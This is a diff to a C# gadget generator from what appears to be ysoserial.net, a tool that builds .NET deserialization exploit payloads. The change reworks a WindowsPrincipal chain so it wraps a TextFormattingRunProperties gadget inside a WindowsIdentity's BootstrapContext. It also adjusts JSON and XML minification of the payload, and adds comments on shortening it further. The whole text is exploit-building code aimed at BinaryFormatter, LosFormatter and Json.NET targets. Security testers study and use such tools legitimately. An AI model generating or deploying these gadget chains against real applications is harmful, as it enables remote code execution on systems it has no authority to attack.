@@ -1,14 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
-using System.Reflection;
 using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Security.Claims;
 using System.Security.Principal;
-using System.Xml;
-using System.Xml.Linq;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
@@ -32,6 +28,9 @@ namespace ysoserial.Generators
         // ## Notes: 
         // "actor" contains the serialized base64 WindowsIdentity which inturn contains a ClaimsIdentity pivoting to BinaryFormatter
         // "m_identity" is the WindowsIdentity property on the WindowsPrincipal / WindowsClaimsPrincipal instance :->
+        //
+        // this uses BinaryFormatter internally - as a result, it is not directly possible to shorten it
+        // it is possible to shorten it in multi steps by creating the parts using JSON to BinaryFormatter capability - only useful when we are absolutely desperate!
 
         public override List<string> SupportedFormatters()
         {
@@ -60,21 +59,19 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            Generator generator = new TypeConfuseDelegateGenerator();
-            WindowsIdentity id = WindowsIdentity.GetCurrent();
-            id.Actor = new ClaimsIdentity();
-            id.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
-            BinaryFormatter bf = new BinaryFormatter();
-            var ms = new MemoryStream();
-            bf.Serialize(ms, id);
-            byte[] gadget = ms.ToArray();
+            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
+            currentWI.Actor = new ClaimsIdentity();
+            //id.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
+            currentWI.Actor.BootstrapContext = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs);
+
+            byte[] gadget =  (byte[]) SerializeWithNoTest(currentWI, "binaryformatter", inputArgs);
             string b64encoded = Convert.ToBase64String(gadget);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
                 WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
-                obj.wi = id;
+                obj.wi = currentWI;
                 return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
@@ -91,7 +88,7 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                        payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, new string[] { ",mscorlib" });
                     }
                     else
                     {
@@ -129,7 +126,7 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, new string[] { ",mscorlib" });
                     }
                     else
                     {
